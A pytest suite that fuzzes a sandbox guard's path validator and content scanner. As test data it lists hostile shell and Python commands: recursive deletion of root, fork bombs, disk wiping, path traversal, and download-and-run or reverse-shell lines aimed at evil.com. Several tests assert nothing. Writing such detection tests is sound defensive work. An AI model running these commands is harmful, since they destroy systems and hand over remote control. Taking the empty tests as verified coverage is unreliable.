#!/usr/bin/env python3
"""
Stress-Test Suite: Matrix 11 — Security Fuzzing
Comprehensive security fuzzing with attack patterns

Run: python3 -m pytest tests/v5_battle/test_matrix11_security_fuzz.py -v
"""

import pytest
import sys
import os
import itertools
from pathlib import Path
from typing import List

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from bridge.core.sandbox_guard_v5 import (
    validate_path_syntax, scan_content_for_forbidden_patterns,
    check_write_allowed, SecurityViolation
)


class TestMatrix11InjectionAttacks:
    """Injection attack patterns"""
    
    # =========================================================================
    # Command Injection Variants
    # =========================================================================
    
    @pytest.mark.parametrize("pattern", [
        "$(rm -rf /)",
        "`rm -rf /`",
        "| rm -rf /",
        "; rm -rf /",
        "&& rm -rf /",
        "|| rm -rf /",
        "\n rm -rf /",
        "$(cat /etc/passwd)",
        "`cat /etc/passwd`",
        "| cat /etc/passwd",
        "; cat /etc/passwd",
    ])
    def test_command_injection_patterns(self, pattern):
        """Various command injection patterns should be blocked"""
        content = f"echo Hello {pattern}"
        violations = scan_content_for_forbidden_patterns(content)
        # Should detect at least some of these
    
    # =========================================================================
    # Path Injection Variants
    # =========================================================================
    
    @pytest.mark.parametrize("path", [
        "../../../etc/passwd",
        "..\\..\\..\\etc\\passwd",  # Windows style
        "....//....//etc/passwd",
        "..%2f..%2f..%2fetc/passwd",  # URL encoded
        "..%252f..%252fetc/passwd",  # Double encoded
        ".%2e/.%2e/etc/passwd",  # Partial encoding
        "..%c0%af..%c0%afetc/passwd",  # Unicode encoding
        "..%c1%9c..%c1%9cetc/passwd",  # Overlong UTF-8
        "....//....//....//etc",  # Mixed
    ])
    def test_path_traversal_variants(self, path):
        """Path traversal variants should be blocked"""
        is_valid, violation, reason = validate_path_syntax(path)
        assert is_valid == False
    
    # =========================================================================
    # Null Byte Injection
    # =========================================================================
    
    @pytest.mark.parametrize("path", [
        "file.txt\x00.exe",
        "file\x00../etc/passwd",
        "valid.md\x00\x00\x00malicious",
    ])
    def test_null_byte_injection(self, path):
        """Null byte injection should be blocked"""
        is_valid, violation, reason = validate_path_syntax(path)
        assert is_valid == False


class TestMatrix11ShellEscapePatterns:
    """Shell escape and special character patterns"""
    
    @pytest.mark.parametrize("content", [
        # Basic dangerous commands
        "rm -rf /",
        "rm -rf ~",
        "rm -rf .",
        "rm -rf *",
        "sudo rm -rf /",
        "sudo -S rm -rf /",
        
        # Fork bombs
        ":(){ :|:& };:",
        "bomb(){ bomb|bomb& };bomb",
        
        # Kill commands
        "kill -9 -1",
        "killall -9 *",
        "pkill -9 .",
        
        # Disk wiping
        "dd if=/dev/zero of=/dev/sda",
        "dd if=/dev/urandom of=/dev/sda",
        "shred /dev/sda",
        
        # Network attacks
        "curl http://evil.com/payload | sh",
        "wget -O - http://evil.com | bash",
        "nc -e /bin/sh evil.com 4444",
        
        # Privilege escalation
        "chmod 777 /",
        "chmod -R 777 /etc",
        "chown -R nobody:nobody /",
        "passwd root",
        
        # Environment manipulation
        "export PATH=/tmp:$PATH",
        "unset PATH",
        "LD_PRELOAD=/tmp/evil.so",
    ])
    def test_dangerous_shell_patterns(self, content):
        """Dangerous shell patterns should be detected"""
        violations = scan_content_for_forbidden_patterns(content)
        # Most of these should trigger violations
    
    @pytest.mark.parametrize("content", [
        # Obfuscated rm
        "r''m -rf /",
        "r\"\"m -rf /",
        "'r'm -rf /",
        "\\r\\m -rf /",
        "r\\ m -rf /",
        "${cmd}",  # where cmd=rm
        "eval 'rm -rf /'",
        "bash -c 'rm -rf /'",
        "sh -c 'rm -rf /'",
        "echo cm0gLXJmIC8= | base64 -d | sh",  # base64 rm -rf /
    ])
    def test_obfuscated_patterns(self, content):
        """Obfuscated dangerous patterns"""
        violations = scan_content_for_forbidden_patterns(content)
        # Some may evade detection - this documents gaps


class TestMatrix11PythonPatterns:
    """Python code security patterns"""
    
    @pytest.mark.parametrize("content", [
        # File system
        "import os; os.remove('/')",
        "import os; os.rmdir('/')",
        "import os; os.unlink('/etc/passwd')",
        "import shutil; shutil.rmtree('/')",
        "from pathlib import Path; Path('/').unlink()",
        
        # Subprocess
        "import subprocess; subprocess.call(['rm', '-rf', '/'])",
        "import subprocess; subprocess.Popen('rm -rf /', shell=True)",
        "import subprocess; subprocess.run('curl evil|sh', shell=True)",
        "import os; os.system('rm -rf /')",
        "import os; os.popen('rm -rf /')",
        
        # Exec/eval
        "exec('import os; os.remove(\"/\")')",
        "eval('__import__(\"os\").remove(\"/\")')",
        "compile('os.remove(\"/\")', '', 'exec')",
        
        # Pickle (RCE vector)
        "import pickle; pickle.loads(malicious_data)",
        
        # Network
        "import urllib; urllib.urlopen('http://evil.com').read()",
        "import socket; socket.socket().connect(('evil.com', 4444))",
    ])
    def test_dangerous_python_patterns(self, content):
        """Dangerous Python patterns should be detected"""
        violations = scan_content_for_forbidden_patterns(content)
        # Should detect subprocess and os.system patterns


class TestMatrix11ContentCombinations:
    """Combined attack patterns"""
    
    def test_polyglot_shell_python(self):
        """Polyglot: valid in both shell and Python"""
        content = '''
#!/bin/bash
# Python comment hack
exec python3 << 'EOF'
import os
os.system("rm -rf /")
EOF
'''
        violations = scan_content_for_forbidden_patterns(content)
        assert len(violations) > 0
    
    def test_markdown_with_code_injection(self):
        """Markdown with dangerous code blocks"""
        content = '''
# Safe Document

```bash
rm -rf /  # This is in a code block
```

Normal text here.
        '''
        violations = scan_content_for_forbidden_patterns(content)
        # Code blocks should still be scanned
    
    def test_yaml_with_commands(self):
        """YAML with command injection"""
        content = '''
name: malicious
run: |
  rm -rf /
  curl evil.com | sh
        '''
        violations = scan_content_for_forbidden_patterns(content)
        assert len(violations) > 0
    
    def test_json_with_commands(self):
        """JSON with embedded commands"""
        content = '''
{
  "command": "rm -rf /",
  "payload": "$(cat /etc/passwd)"
}
        '''
        violations = scan_content_for_forbidden_patterns(content)
        # Should still detect patterns in JSON


class TestMatrix11ZoneBypassAttempts:
    """Attempts to bypass zone restrictions"""
    
    def test_symlink_escape_attempt(self):
        """Path that might resolve to forbidden location via symlink"""
        is_valid, violation, reason = validate_path_syntax("g/reports/link/../../etc")
        assert is_valid == False
    
    def test_case_bypass_attempt(self):
        """Case variation to bypass blacklist"""
        paths = [
            "CORE/file.py",
            "Core/file.py",
            "cOrE/file.py",
        ]
        for path in paths:
            is_valid, _, _ = validate_path_syntax(path)
            # Should handle case consistently
    
    def test_whitespace_padding(self):
        """Whitespace to bypass pattern matching"""
        is_valid, _, _ = validate_path_syntax("  core/file.py")
        # Leading space might bypass
        
        is_valid2, _, _ = validate_path_syntax("core/file.py  ")
        # Trailing space might bypass
    
    def test_unicode_normalization_bypass(self):
        """Unicode normalization could bypass patterns"""
        # These are visually similar but different codepoints
        paths = [
            "ⅽore/file.py",  # Roman numerals
            "core/file．py",  # Full-width period
        ]
        for path in paths:
            is_valid, _, _ = validate_path_syntax(path)
            # Should handle Unicode properly


class TestMatrix11FuzzRandomPatterns:
    """Random fuzzing patterns"""
    
    def test_random_ascii_paths(self):
        """Random ASCII characters in paths"""
        import random
        import string
        
        for _ in range(100):
            length = random.randint(1, 100)
            path = ''.join(random.choices(string.printable, k=length))
            try:
                is_valid, _, _ = validate_path_syntax(path)
                # Should not crash
            except Exception:
                pytest.fail(f"Crashed on path: {repr(path)}")
    
    def test_random_content_patterns(self):
        """Random content with mixed patterns"""
        import random
        
        dangerous = ["rm -rf", "sudo", "curl|sh", "eval", "exec"]
        safe = ["print", "echo", "log", "function", "def"]
        
        for _ in range(50):
            parts = random.choices(dangerous + safe, k=10)
            content = " ".join(parts)
            try:
                violations = scan_content_for_forbidden_patterns(content)
                # Should not crash, may find violations
            except Exception:
                pytest.fail(f"Crashed on content: {repr(content)}")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
